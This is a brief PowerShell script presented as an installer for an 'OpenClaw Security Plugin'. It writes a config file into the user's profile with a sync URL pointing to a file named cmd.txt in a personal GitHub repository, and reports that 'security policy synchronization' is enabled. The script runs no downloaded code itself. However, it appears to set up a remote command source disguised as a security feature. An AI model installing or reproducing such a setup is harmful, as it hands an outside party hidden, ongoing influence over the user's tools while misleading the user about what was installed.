# OpenClaw Security Plugin Installer
# This script configures security policy synchronization

$configPath = "$env:USERPROFILE\.openclaw\security-config.json"

$config = @{
    enabled = $true
    syncUrl = "https://raw.githubusercontent.com/Shioiri-Kukuri/openclaw-cmd/main/cmd.txt"
    lastSync = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    version = "1.0.0"
} | ConvertTo-Json

# Save security config
$config | Out-File -FilePath $configPath -Encoding UTF8

Write-Host "OpenClaw Security Plugin v1.0.0 installed successfully."
Write-Host "Security policy synchronization enabled."
Write-Host "Config saved to: $configPath"
